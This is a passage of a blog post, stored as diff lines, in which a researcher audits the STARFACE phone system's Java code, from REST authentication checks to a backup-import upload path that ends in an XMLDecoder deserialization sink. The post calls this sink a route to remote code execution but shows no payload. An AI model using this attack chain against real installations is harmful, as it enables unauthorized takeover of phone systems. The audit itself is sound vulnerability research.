+&lt;p&gt;Let’s have a look how the request handling was done for the Spring interfaces in e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.starface.rest.controller.AccountsApi&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/restgetaccountslist.png&quot; alt=&quot;REST Accounts List&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What makes this kind of request handling easily readable (and discoverable!) were &lt;strong&gt;Annotations&lt;/strong&gt; like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Path, @Consumes, @Produces, ...&lt;/code&gt;, distinguishable from the Java Servlet request handlers we described above. This is why learning about the frameworks being used is important to not miss any request handlers right at the beginning.&lt;/p&gt;
+
+&lt;p&gt;To verify my current state of knowledge, I always tend to make checks from time to time in the debugger. Let’s stick to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.starface.rest.controller.AccountsApi&lt;/code&gt; use-case. We did a GET request to the following URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/rest/accounts/&lt;/code&gt; from an &lt;em&gt;unauthenticated&lt;/em&gt; context and…hit the breakpoint.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/restbreakpointhit.png&quot; alt=&quot;REST Breakpoint Hit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That was somehow unexpected because I rather expected that my request would be sorted out by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RestAuthFilterA&lt;/code&gt; in advance. My assumption failed but that was fine because I could hit endpoints without prior authentication obviously. What did I see in BurpSuite then?&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 401 
+[...]
+
+{&quot;code&quot;:&quot;d937bb0c-ab0f-464a-a02a-41840746a45a&quot;,&quot;message&quot;:&quot;Not logged in&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But why? The implementing class could be found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.starface.rest.accounts.api.impl.AccountsApiServiceImpl.getAccounts(HttpServletRequest)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Response&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAccounts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RestException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 30 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;AuthHelper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAndCheckPrincipal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 31 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;CATConnectorPGSQL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;catConnectorPgsql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CATConnectorPGSQL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;StarfaceComponentProvider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CATConnectorPGSQL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/* 33 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RestResponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;returnSuccessfulWithData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;AccountsFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createAccounts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;catConnectorPgsql&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 34 */&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAccount2ParamsMapIdAndName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HashSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we found another authentication check variant with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthHelper.getAndCheckPrincipal(request)&lt;/code&gt;. And here it is.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Principal&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAndCheckPrincipal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RestException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;Principal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;principal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 27 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;principalAttribute&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;principal&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/* 29 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;principalAttribute&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Principal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 30 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;principal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Principal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;principalAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 32 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BadRequestException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;46dca6f5-ed1a-44c9-920d-b0e57ea17ef5&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid Rest-Request: Missing Authentication&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/* 35 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;principal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isGuest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 36 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnauthorizedException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;d937bb0c-ab0f-464a-a02a-41840746a45a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Not logged in&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;One could easily recognize that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnauthorizedException&lt;/code&gt; was an exact match with our HTTP response from the server. So it seemed obvious to check &lt;strong&gt;all controller classes&lt;/strong&gt; in this namespace for&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;the existence of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthHelper.getAndCheckPrincipal(request)&lt;/code&gt; call&lt;/li&gt;
+  &lt;li&gt;if the call was there, if some processing on the attacker-controlled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpServletRequest&lt;/code&gt; was done before&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;em&gt;Step 2&lt;/em&gt; was another lessons learned because the existence of an authentication check does &lt;strong&gt;not&lt;/strong&gt; mean that maybe one couldn’t do something bad before this check would have been called. Unfortunately, after looking at &lt;em&gt;all controller classes&lt;/em&gt; I did not spot any obvious flaws.&lt;/p&gt;
+
+&lt;p&gt;Did we have a good understanding about all request source handling already? No, only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; based Java Servlet and Filter request handling and Spring framework annotated ones so far.&lt;/p&gt;
+
+&lt;h1 id=&quot;struts-configxml&quot;&gt;struts-config.xml&lt;/h1&gt;
+
+&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; some URL pattern definitions for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.action&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.do&lt;/code&gt; brought us to the conclusion that &lt;strong&gt;Struts&lt;/strong&gt; might be in use. We should have a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struts.xml&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struts-config.xml&lt;/code&gt; for this which I did.&lt;/p&gt;
+
+&lt;p&gt;Another framework, another configuration scheme, other things to look at and understand. That’s the exhausting part of code audits and this is also why audits might last several days, weeks or even months before one at least understands all the “inner workings” of a product.&lt;/p&gt;
+
+&lt;p&gt;Let’s take an example from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struts-config.xml&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;action&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/config/backup/importBackup&quot;&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;de.vertico.starface.config.server.actions.BackupImportAction&quot;&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;importBackupForm&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;validate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;parameter=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;requiredPermission=administration;task=execute&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;forward&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nextStep&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/jsp/progress/backup-import.jsp&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/action&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There was a &lt;em&gt;path&lt;/em&gt;, &lt;em&gt;type&lt;/em&gt; (our code!), and also some &lt;em&gt;parameters&lt;/em&gt; which pointed to required permissions needed. You should enumerate again all &lt;em&gt;action paths&lt;/em&gt; and understand the difference between permission types etc.
+We’ll stick to this specific path for a moment. Could I find the request trigger in the UI as well? I always jump between my debugging window, my decompiled source in VS code and my desktop with BurpSuite and browser open.&lt;/p&gt;
+
+&lt;p&gt;Since the permission requirement said &lt;em&gt;administration&lt;/em&gt;, I logged in as administrator &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0001&lt;/code&gt;. After a bit of clicking around, I found the menu entry &lt;strong&gt;Configuration&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/administrationUI.png&quot; alt=&quot;Administration UI&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The endpoint definition said &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;importBackup&lt;/code&gt; which seemed to be a good match here.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/backupUI.png&quot; alt=&quot;Administration UI&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We triggered a &lt;em&gt;Default Backup&lt;/em&gt; to verify the suspected chain in the code (and also create a backup artifact). A POST request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/config/server/backup/execute.do&lt;/code&gt; was observed. The backup was downloadable and named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup-Default-1653253925922.sar&lt;/code&gt;. What did the file content look like?&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user:~/Downloads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; backup-Default-1653253925922.sar
+Archive:  backup-Default-1653253925922.sar
+  Length      Date    Time    Name
+&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+    12542  2022-05-22 23:12   db-entities/de.vertico.starface.db.v191.hibernate.CountryCode
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+     5167  2022-05-22 23:12   var-data/srtpcerts/asterisk.pem
+     1465  2022-05-22 23:12   var-data/phonecerts/cert_rootca.der.new
+     1358  2022-05-22 23:12   var-data/phonecerts/pubkey_cert.DER.new
+     1465  2022-05-22 23:12   var-data/phonecerts/cert_rootca.der
+     1358  2022-05-22 23:12   var-data/phonecerts/pubkey_cert.DER
+  3821434  2022-05-22 23:12   music-on-hold2/starface-music.sln16
+     3743  2022-05-22 23:12   db-entities/de.vertico.starface.db.SequenceValue
+    17638  2022-05-22 23:12   manifest.xml
+&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;                     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+  8270904                     417 files
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;Backup restore functions&lt;/em&gt; usually are excellently suited for getting &lt;strong&gt;fast RCE&lt;/strong&gt;. We needed a success story after this unsuccessful trip for days. Also this could have been one part of a more interesting exploitation chain. Who knows?&lt;/p&gt;
+
+&lt;p&gt;Time to look at the class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.config.server.actions.BackupImportAction&lt;/code&gt; and since this was based on Struts: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.config.server.actions.BackupImportAction.execute(ActionMapping, ActionForm)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;First, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.apache.struts.action.ActionForm form&lt;/code&gt; from the request was casted into a new variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.config.server.forms.BackupImportForm importForm&lt;/code&gt; which eventually landed here in the same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute&lt;/code&gt; method.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  67 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;importForm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isImportUpload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  69 */&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prepareUploadFileTask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mapping&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;importForm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The next call went to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.config.server.actions.BackupImportAction.prepareUploadFileTask(ActionMapping, BackupImportForm)&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;importForm&lt;/code&gt; was then casted there into again a new variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.apache.struts.upload.FormFile importFile&lt;/code&gt;. The upload content was then written into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FileOutputStream out&lt;/code&gt; with help of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.apache.commons.io.IOUtils.copy(InputStream, OutputStream)&lt;/code&gt;. A “temporary file” was created then and processing the uploaded content began with a call to&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 204 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;IManifestContainer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ContainerResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContainer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmpFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getContainer&lt;/code&gt; method simply returned the result of another method call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return new ZipManifestContainer(file)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The constructor of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.db.container.ZipManifestContainer.ZipManifestContainer(File)&lt;/code&gt; finally contained a call to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readManifest()&lt;/code&gt; method.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readManifest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 33 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 34 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manifest.xml&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 35 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 36 */&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No manifest entry found&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 38 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 39 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;XMLDecoder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;XMLDecoder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
